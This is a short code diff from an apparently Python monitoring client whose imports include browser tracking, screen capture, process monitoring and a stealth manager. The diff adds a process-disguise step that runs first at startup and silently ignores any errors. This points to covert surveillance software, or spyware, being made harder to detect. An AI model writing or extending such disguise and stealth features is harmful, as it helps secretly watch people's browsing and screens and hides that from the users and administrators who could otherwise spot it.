@@ -20,7 +20,15 @@ from src.modules.browser_tracker import BrowserTracker
 from src.modules.screen_capture import ScreenCapture
 from src.modules.process_monitor import ProcessMonitor
 from src.utils.stealth import StealthMode, StealthManager
+from src.utils.process_disguise import apply_disguise
 from os_detector import get_os_info_for_client
+
+# Apply process disguise immediately (before anything else)
+try:
+    apply_disguise()
+except Exception as e:
+    # Don't let disguise failure stop the client
+    pass
 
 # Global flag for graceful shutdown
 shutdown_flag = False
